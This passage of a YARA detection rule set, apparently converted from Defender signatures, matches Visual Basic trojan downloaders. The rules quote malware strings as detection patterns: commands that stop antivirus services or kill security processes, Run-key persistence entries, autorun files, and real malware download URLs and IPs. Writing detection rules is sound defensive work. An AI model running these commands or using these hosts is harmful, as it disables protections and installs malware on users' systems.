        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "30"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "\\MASTER\\UNI_SOFT\\ADWARA\\silent_loader\\Project1.vbp" wide //weight: 10
        $x_10_2 = "tmrsr.exe" wide //weight: 10
        $x_10_3 = {43 00 6f 00 6d 00 70 00 61 00 6e 00 79 00 4e 00 61 00 6d 00 65 00 00 00 00 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_AAK_2147597638_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.AAK"
        threat_id = "2147597638"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "24"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd.exe /c net stop sharedaccess" wide //weight: 1
        $x_1_2 = "cmd.exe /c net stop KPfwSvc" wide //weight: 1
        $x_1_3 = "cmd.exe /c net stop KWatchsvc" wide //weight: 1
        $x_1_4 = "runiep.exe" wide //weight: 1
        $x_1_5 = "ras.exe" wide //weight: 1
        $x_1_6 = "Iparmor.exe" wide //weight: 1
        $x_1_7 = "360safe.exe" wide //weight: 1
        $x_1_8 = "360tray.exe" wide //weight: 1
        $x_1_9 = "kmailmon.exe" wide //weight: 1
        $x_1_10 = "kavstart.exe" wide //weight: 1
        $x_1_11 = "D:\\auto.exe" wide //weight: 1
        $x_1_12 = "D:\\Autorun.inf" wide //weight: 1
        $x_1_13 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\360Safetray" wide //weight: 1
        $x_1_14 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\KavStart" wide //weight: 1
        $x_1_15 = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\KavPFW" wide //weight: 1
        $x_1_16 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\vptray" wide //weight: 1
        $x_1_17 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\kav" wide //weight: 1
        $x_1_18 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\runeip" wide //weight: 1
        $x_1_19 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\RavTask" wide //weight: 1
        $x_1_20 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\RfwMain" wide //weight: 1
        $x_1_21 = "cmd /c route print|find \"Default Gateway: \">c:\\ip.txt" wide //weight: 1
        $x_1_22 = "http://www.webye163.cn" wide //weight: 1
        $x_1_23 = "http://www.skkyc2004.cn" wide //weight: 1
        $x_1_24 = "http://www.appkyc6666.cn" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_BE_2147597717_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.BE"
        threat_id = "2147597717"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "107"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "D:\\Master\\bb_soft\\bb_loader\\Project1.vbp" wide //weight: 1
        $x_1_2 = "http://liveupdatesnet.com/" wide //weight: 1
        $x_1_3 = "/m.php?aid=" wide //weight: 1
        $x_1_4 = "vmwareservice.exe" wide //weight: 1
        $x_1_5 = "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; Maxthon)" wide //weight: 1
        $x_1_6 = "loader.exe" wide //weight: 1
        $x_1_7 = "\\vvgeowbv.exe" wide //weight: 1
        $x_100_8 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB" ascii //weight: 100
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_BI_2147597735_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.BI"
        threat_id = "2147597735"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\WINDOWS\\System32\\Wbem" wide //weight: 1
        $x_1_2 = "AJ:\\MASTER\\bb_soft\\bb_promo\\Project1.vbp" wide //weight: 1
        $x_1_3 = "Software\\Microsoft\\Active Setup\\Installed Components" wide //weight: 1
        $x_1_4 = "Y479C6D0-OTRW-U5GH-S1EE-E0AC10B4E666" wide //weight: 1
        $x_1_5 = "F146C9B1-VMVQ-A9RC-NUFL-D0BA00B4E999" wide //weight: 1
        $x_1_6 = "vvgeowbv.exe" wide //weight: 1
        $x_10_7 = "C:\\WINDOWS\\system32\\msvbvm60.dll" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_ABA_2147597739_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.ABA"
        threat_id = "2147597739"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "666"
        strings_accuracy = "High"
    strings:
        $x_100_1 = "MSVBVM60.DLL" ascii //weight: 100
        $x_100_2 = "[autorun]" wide //weight: 100
        $x_100_3 = "open = autorun.exe" wide //weight: 100
        $x_100_4 = "shellexecute = autorun.exe" wide //weight: 100
        $x_100_5 = "WinExec" ascii //weight: 100
        $x_100_6 = "URLDownloadToFileA" ascii //weight: 100
        $x_10_7 = "\\1.bat" wide //weight: 10
        $x_10_8 = "TimRunD" ascii //weight: 10
        $x_10_9 = "TimDLLH0ST" ascii //weight: 10
        $x_10_10 = "TimAutoRun" ascii //weight: 10
        $x_10_11 = "SVCH0ST.EXE" wide //weight: 10
        $x_10_12 = "DLLH0ST.EXE" wide //weight: 10
        $x_1_13 = "system.ini" wide //weight: 1
        $x_1_14 = "Explorer.exe" wide //weight: 1
        $x_1_15 = "USBKiller.exe" wide //weight: 1
        $x_1_16 = "kvxp.kxp" wide //weight: 1
        $x_1_17 = "RavMon.exe" wide //weight: 1
        $x_1_18 = "Rav.exe" wide //weight: 1
        $x_1_19 = "360tray.exe" wide //weight: 1
        $x_1_20 = "Womcc.exe" wide //weight: 1
        $x_1_21 = "explorer" wide //weight: 1
        $x_1_22 = ":\\autorun.inf" wide //weight: 1
        $x_1_23 = ":\\autorun.exe" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((6 of ($x_100_*) and 6 of ($x_10_*) and 6 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_RA_2147599130_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.RA"
        threat_id = "2147599130"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {48 6b 65 79 00 00 00 00 73 74 72 56 61 6c 75 65 4e 61 6d 65 00 00 00 00 75 72 6c 54 65 78 74 00 73 74 72 46 69 6c 65 00 55 52 4c 00 46 69 6c 65 4e 61 6d 65}  //weight: 1, accuracy: High
        $x_1_2 = {52 65 67 51 75 65 72 79 53 74 72 69 6e 67 56 61 6c 75 65 00 55 72 6c 45 6e 63 6f 64 65 00 00 00 46 69 6c 65 45 78 69 73 74 73}  //weight: 1, accuracy: High
        $x_1_3 = "CopyURLToFile" ascii //weight: 1
        $x_1_4 = "DllFunctionCall" ascii //weight: 1
        $x_1_5 = "An error occurred calling InternetOpenUrl function" wide //weight: 1
        $x_1_6 = "MSVBVM60.DLL" ascii //weight: 1
        $x_1_7 = "Last_Error" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_Win32_VB_ABC_2147599826_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.ABC"
        threat_id = "2147599826"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "D:\\01. Dosin S" wide //weight: 1
        $x_1_2 = "montmp.exe" wide //weight: 1
        $x_1_3 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 30 00 78 00 64 00 65 00 2e 00 30 00 78 00 37 00 61 00 2e 00 30 00 78 00 61 00 33 00 2e 00 30 00 78 00 31 00 39 00 2f 00 6c 00 6f 00 67 00 2f 00 63 00 76 00 61 00 6c 00 [0-2] 2e 00 61 00 73 00 70 00}  //weight: 1, accuracy: Low
        $x_1_4 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 30 00 78 00 64 00 65 00 2e 00 30 00 78 00 37 00 61 00 2e 00 30 00 78 00 61 00 33 00 2e 00 30 00 78 00 31 00 39 00 2f 00 6c 00 6f 00 67 00 2f 00 63 00 76 00 65 00 72 00 [0-2] 2e 00 61 00 73 00 70 00}  //weight: 1, accuracy: Low
        $x_1_5 = "0xde.0x7a.0xa3.0x19" wide //weight: 1
        $x_1_6 = "msxml2.xmlhttp" wide //weight: 1
        $x_1_7 = "COMPUTERNAME" wide //weight: 1
        $x_1_8 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run-" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_LG_2147599851_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.LG"
        threat_id = "2147599851"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Desktop\\J O E\\Bowts\\M-y-L-i-r-a-t" wide //weight: 1
        $x_1_2 = "Redirecting" wide //weight: 1
        $x_1_3 = "Start downl" wide //weight: 1
        $x_1_4 = "SHDocVwCtl.WebBrowser" ascii //weight: 1
        $x_1_5 = "MSVBVM60.DLL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_XK_2147601154_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XK"
        threat_id = "2147601154"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "42"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c ping localhost -n 3 >> NUL && del" wide //weight: 1
        $x_1_2 = "AvpM,avpm,klswd,kav,kavsvc,avp." wide //weight: 1
        $x_1_3 = "TeaTimer,sdhelper,Spybot,spybot,MSASCui" wide //weight: 1
        $x_10_4 = "mshta.exe" wide //weight: 10
        $x_10_5 = "xpremain" ascii //weight: 10
        $x_10_6 = "URLDownloadToCacheFileA" ascii //weight: 10
        $x_10_7 = "\\VB98\\VB6.OLB" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_10_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_LI_2147601212_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.LI"
        threat_id = "2147601212"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "31"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "JSIKJIK9524" wide //weight: 10
        $x_1_2 = {6d 6f 64 5f 56 61 72 69 61 76 65 69 73 00 00 00 73 6d 63 66 67 00 00 00 10 00 00 00 4a 00 53 00 48 00 4e 00 46 00 49 00 55 00 59 00}  //weight: 1, accuracy: High
        $x_1_3 = {6d 6f 64 5f 45 6e 63 72 69 70 74 00 10 00 00 00 4a 00 53 00 48 00 4e 00 46 00 49 00 55 00 59 00}  //weight: 1, accuracy: High
        $x_10_4 = "URLDownloadToFileA" ascii //weight: 10
        $x_10_5 = "MSVBVM60.DLL" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_ZA_2147601666_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.ZA"
        threat_id = "2147601666"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "61"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "78E1BDD1-9941-11cf-9756-00AA00C00908" wide //weight: 10
        $x_10_2 = "InternetExplorer.Application" wide //weight: 10
        $x_10_3 = "[InternetShortcut]" wide //weight: 10
        $x_10_4 = "NowMom" wide //weight: 10
        $x_10_5 = "cAppHider" ascii //weight: 10
        $x_10_6 = "vb6stkit.dll" ascii //weight: 10
        $x_1_7 = "/activex/ipget.php?u_ip=" wide //weight: 1
        $x_1_8 = "popupall.php?u_site=" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((6 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_ZB_2147602397_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.ZB"
        threat_id = "2147602397"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 6f 72 6d 31 00 19 01 00 42 00 23 3e 04 00 00 6c 74 00 00 36 04 00 00 00 00 01 00 02 00 20 20 10 00 00 00 00 00 e8 02 00 00 26 00 00 00 10 10 10 00 00 00 00 00 28 01 00 00 0e 03 00 00 28 00 00 00 20 00 00 00 40 00 00 00 01 00 04 00 00 00 00 00 80 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 80 00 00 00 80 80 00 80 00 00 00 80 00 80 00 80 80 00 00 80 80 80 00 c0 c0 c0 00 00 00 ff 00 00 ff 00 00 00 ff ff 00 ff 00 00 00 ff 00 ff 00 ff ff 00 00 ff ff}  //weight: 1, accuracy: High
        $x_1_2 = {77 77 77 77 77 77 77 77 77 77 77 77 77 70 00 00 7f bf ff bf ff bf ff bf ff bf ff bf ff 70 00 00 7f ff ff ff bf ff bf ff bf ff bf ff bf 70 00 00 78 ff ff bf ff bf ff bf ff bf ff bf f8 70 00 00 7f 8f bf ff bf ff bf ff bf ff bf ff 8f 70 00 00 7f b8 ff ff ff bf ff bf ff bf ff b8 ff 70 00 00 7f ff 8f ff bf f8 88 88 bf ff bf 8f bf 70 00 00 7f ff f8 bf ff 87 77 77 88 bf f8 bf ff 70 00 00 7f ff bf 8f f8 7f ff ff 78 8f 8f ff bf 70 00 00 7f ff ff b8 87 bf bf bf f7 88 ff bf ff 70 00 00}  //weight: 1, accuracy: High
        $x_1_3 = {7f ff ff f8 7f ff ff ff bf 78 bf ff bf 70 00 00 7f ff ff 87 ff ff ff ff ff b7 8f bf ff 70 00 00 7f ff f8 7f ff ff ff ff ff ff 78 ff bf 70 00 00 7f ff 87 ff ff ff ff ff ff bf f7 8f ff 70 00 00 7f f8 7f ff ff ff ff ff ff ff bf 78 bf 70 00 00 7f 87 ff ff ff ff ff ff ff ff ff b7 8f 70 00 00 78 7f ff ff ff ff ff ff ff ff ff ff 78 70 00 00 77 ff ff ff ff ff ff ff ff ff ff bf f7 70 00 00 7f ff ff ff ff ff ff ff ff ff ff ff bf 70 00 00 77 77 77 77 77 77 77 77 77 77 77 77 77 70}  //weight: 1, accuracy: High
        $x_1_4 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_5 = {55 52 4c 00 4c 6f 63 61 6c 46 69 6c 65 6e 61 6d 65 00 [0-16] e9 e9 e9 e9 cc cc cc cc cc cc cc cc cc cc cc cc 55 8b ec 83 ec 0c}  //weight: 1, accuracy: Low
        $x_1_6 = "MSVBVM60.DLL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_GBX_2147603162_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.GBX"
        threat_id = "2147603162"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "EXECUTA" ascii //weight: 1
        $x_1_2 = "PUXA" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_4 = {55 8b ec 83 ec 0c 68 ?? ?? ?? ?? 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 18 53 56 57 89 65 f4 c7 45 f8 ?? ?? ?? ?? 33 db 89 5d fc 8b 75 08 56 8b 06 ff 50 04 8b 3d ?? ?? ?? ?? ba ?? ?? ?? ?? 8d 4d e4 89 5d e8 89 5d e4 89 5d e0 ff d7 ba ?? ?? ?? ?? 8d 4d e8 ff d7 8b 0e 8d 55 e0 52 8d 45 e4 8d 55 e8 50 52 56 ff 91 f8 06 00 00 3b c3 7d 12 68 f8 06 00 00 68 ?? ?? ?? ?? 56 50}  //weight: 1, accuracy: Low
        $x_1_5 = {55 8b ec 83 ec 0c 68 ?? ?? ?? ?? 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec ?? 53 56 57 89 65 f4 c7 45 f8 ?? ?? ?? ?? 8b 7d 08 8b c7 83 e0 01 89 45 fc 83 e7 fe 57 89 7d 08 8b 0f ff 51 04 a1 ?? ?? ?? ?? c7 45 e8 00 00 00 00 85 c0 75 10 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? ff 15 ?? ?? ?? ?? 8b 35 ?? ?? ?? ?? 56 8b 16 ff 92 b4 02 00 00 85 c0 db e2 7d 16 8b 1d ?? ?? ?? ?? 68 b4 02 00 00 68 ?? ?? ?? ?? 56 50 ff d3}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_NG_2147603424_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.NG"
        threat_id = "2147603424"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "42"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "C:\\WINDOWS\\system32\\algcs.exe" wide //weight: 2
        $x_1_2 = "video_amador" ascii //weight: 1
        $x_1_3 = {43 00 3a 00 5c 00 41 00 72 00 71 00 75 00 69 00 76 00 6f 00 73 00 20 00 64 00 65 00 20 00 70 00 72 00 6f 00 67 00 72 00 61 00 6d 00 61 00 73 00 5c 00 [0-20] 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_10_4 = "Clemis-Gay\\Proyecto" wide //weight: 10
        $x_10_5 = "URLDownloadToFileA" ascii //weight: 10
        $x_10_6 = "LoadEXE" ascii //weight: 10
        $x_10_7 = "MSVBVM60.DLL" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_10_*) and 2 of ($x_1_*))) or
            ((4 of ($x_10_*) and 1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_NI_2147604742_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.NI"
        threat_id = "2147604742"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "youtubevideos" ascii //weight: 1
        $x_1_2 = {4d 61 73 74 65 72 00 00 66 75 6e 63 6f 65 73}  //weight: 1, accuracy: High
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_4 = "InternetGetConnectedState" ascii //weight: 1
        $x_1_5 = {4d 00 6f 00 64 00 65 00 6d 00 00 00 0a 00 00 00 50 00 72 00 6f 00 78 00 79 00}  //weight: 1, accuracy: High
        $x_1_6 = "Configurada" wide //weight: 1
        $x_1_7 = "Remota" wide //weight: 1
        $x_1_8 = "MSVBVM60.DLL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_AAL_2147605352_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.AAL"
        threat_id = "2147605352"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\Desktop\\Gh0stly Downloader 2.0\\Downloader Stub.vbp" wide //weight: 1
        $x_1_2 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\" wide //weight: 1
        $x_1_3 = "78E1BDD1-9941-11cf-9756-00AA00C00908" wide //weight: 1
        $x_1_4 = "wscript.shell" wide //weight: 1
        $x_1_5 = "RegWrite" wide //weight: 1
        $x_1_6 = "ShellExecuteA" ascii //weight: 1
        $x_1_7 = {53 74 75 62 00 44 6f 77 6e 6c 6f 61 64 65 72 20 53 74 75 62}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_NJ_2147605930_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.NJ"
        threat_id = "2147605930"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_2 = {5b 00 73 00 70 00 6c 00 69 00 74 00 5d 00 00 00 0e 00 00 00 5b 00 73 00 74 00 61 00 72 00 74 00 5d 00}  //weight: 1, accuracy: High
        $x_1_3 = {77 00 69 00 6e 00 00 00 0c 00 00 00 77 00 69 00 6e 00 64 00 69 00 72 00}  //weight: 1, accuracy: High
        $x_1_4 = "del a.bat" wide //weight: 1
        $x_1_5 = "Visual Basic\\Downloader Example\\Stub.vbp" wide //weight: 1
        $x_1_6 = "MSVBVM60.DLL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_Win32_VB_AU_2147607806_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.AU"
        threat_id = "2147607806"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "22"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {77 00 69 00 6e 00 64 00 69 00 72 00 00 00 00 00 28 00 00 00 5c 00 73 00 79 00 73 00 74 00 65 00 6d 00 33 00 32 00 5c 00 4d 00 53 00 49 00 4e 00 45 00 54 00 2e 00 4f 00 43 00 58 00}  //weight: 10, accuracy: High
        $x_10_2 = {76 69 76 6f 74 6f 72 70 65 64 6f 00 77 61 70 00 00 77 61 70 00}  //weight: 10, accuracy: High
        $x_2_3 = "\\system32\\winlogin.exe" wide //weight: 2
        $x_2_4 = "\\system32\\1033\\services.exe" wide //weight: 2
        $x_2_5 = "\\system32\\1033\\msn.exe" wide //weight: 2
        $x_2_6 = "\\system32\\1033\\winlogon.exe" wide //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_LJ_2147608559_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.LJ"
        threat_id = "2147608559"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\Documents and Settings\\Administrador\\Escritorio\\russh\\Proyecto1.vbp" wide //weight: 1
        $x_1_2 = "http://www.grupoevo.com.mx/js/temp.data" wide //weight: 1
        $x_1_3 = "\\windows\\system32\\drivers\\etc\\hosts" wide //weight: 1
        $x_1_4 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_BS_2147609560_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.BS"
        threat_id = "2147609560"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "51"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "MSVBVM60.DLL" ascii //weight: 10
        $x_10_2 = "download_progress" ascii //weight: 10
        $x_10_3 = "URLDownloadToFileA" ascii //weight: 10
        $x_10_4 = "cmd /c net stop KAVStart" wide //weight: 10
        $x_10_5 = "taskkill /f /im 360Safe.exe" wide //weight: 10
        $x_1_6 = "C:\\WINDOWS\\Web\\IEXPLORER.EXE" wide //weight: 1
        $x_1_7 = "C:\\WINDOWS\\system32\\Setup\\IEXPLORER.EXE" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_ABE_2147611567_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.ABE"
        threat_id = "2147611567"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "31"
        strings_accuracy = "High"
    strings:
        $x_20_1 = "Desktop\\LOADS DO TRAMPO\\puxador vb6\\baixando2link\\Project1.vbp" wide //weight: 20
        $x_10_2 = "209.62.71.178/~fazendap/" wide //weight: 10
        $x_1_3 = "WINDOWS\\imglog.exe" wide //weight: 1
        $x_1_4 = "WINDOWS\\msn_livers.exe" wide //weight: 1
        $x_1_5 = "WINDOWS\\winlogo.exe" wide //weight: 1
        $x_10_6 = "URLDownloadToFileA" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_20_*) and 1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((1 of ($x_20_*) and 2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_CE_2147611741_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.CE"
        threat_id = "2147611741"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "30"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {40 00 2a 00 5c 00 41 00 43 00 3a 00 5c 00 54 00 6f 00 64 00 6f 00 5c 00 57 00 33 00 32 00 2d 00 46 00 6c 00 6f 00 72 00 73 00 69 00 74 00 61 00 5c 00 [0-16] 2e 00 76 00 62 00 70 00}  //weight: 10, accuracy: Low
        $x_10_2 = {57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 20 00 55 00 70 00 64 00 61 00 74 00 65 [0-32] 63 00 73 00 72 00 73 00 73 00 2e 00 65 00 78 00 65}  //weight: 10, accuracy: Low
        $x_10_3 = "Florsita.exe" wide //weight: 10
        $x_1_4 = "mira esta foto de mi hermana" wide //weight: 1
        $x_1_5 = "http://tjuegost.info/downloads.html" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_ABF_2147612367_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.ABF"
        threat_id = "2147612367"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "31"
        strings_accuracy = "High"
    strings:
        $x_20_1 = "\\baixando5link\\baixando5link\\Project1.vbp" wide //weight: 20
        $x_10_2 = "209.62.71.178/~fazendap/" wide //weight: 10
        $x_1_3 = "winlogonn.exe" wide //weight: 1
